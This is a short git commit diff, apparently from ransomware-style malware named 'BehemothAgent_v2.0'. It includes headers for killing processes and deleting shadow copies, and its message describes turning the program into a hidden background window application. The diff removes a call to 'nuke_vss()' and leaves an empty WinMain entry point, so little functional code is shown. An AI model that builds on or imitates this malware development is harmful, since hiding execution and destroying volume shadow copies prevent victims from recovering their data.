d81db27ac0d8984dcf8e0172e8bbe2cdf9b88b84
0xConstant <noroh4xy@protonmail.com>
2023-08-31 19:51:53 -0700

    upgraded to a window application to run in the background

--- BehemothAgent_v2.0/main.cpp
+++ BehemothAgent_v2.0/main.cpp
@@ -1,12 +1,13 @@
 #include <iostream>
+#include <Windows.h>
 #include "gen_uid.h"
 #include "kill_procs.h"
 #include "gen_str.h"
 #include "del_shadows.h"
 
 
-int main()
-{
-    std::cout << nuke_vss() << std::endl;
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
     return 0;
 }
+
